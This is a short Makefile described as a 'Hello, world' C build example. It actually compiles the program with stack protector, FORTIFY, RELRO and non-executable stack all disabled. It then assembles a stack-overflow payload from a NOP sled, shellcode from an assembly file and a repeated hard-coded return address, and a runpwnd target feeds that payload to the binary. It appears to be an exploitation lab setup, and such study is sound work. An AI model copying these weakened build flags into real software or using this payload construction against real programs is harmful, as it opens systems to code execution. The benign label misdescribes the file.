# Makefile exaple for building "Hello, world" C program

CC = gcc

ASM = nasm
ASMFLAGS = 

CFLAGS = \
-Wall \
-Wextra \
-D_FORTIFY_SOURCE=0 \
-O2 \
-g \
-fno-omit-frame-pointer \
-fno-stack-protector \
-z execstack \
-z norelro

SRC = hello.c
BIN = hello

.PHONY:all clean

all:$(BIN) payload.pwnd

$(BIN):$(SRC)
	$(CC) $(CFLAGS) -o $@ $^


payload.pwnd: pwnd.final.asm
	nasm $^ -o payload.tmp; \
	perl -e 'printf "\x90"x(4000-49)' > $@; \
	cat payload.tmp >> $@; \
	perl -e 'printf "\x90"x108' >> $@; \
	perl -e 'print "\x28\xee\xff\xbf"' >> $@; \
	perl -e 'print "\x28\xee\xff\xbf"' >> $@; \
	perl -e 'print "\x28\xee\xff\xbf"' >> $@


runpwnd:
	./$(BIN) "$$(cat payload.pwnd)"

clean:
	rm $(BIN)
	rm payload.pwnd

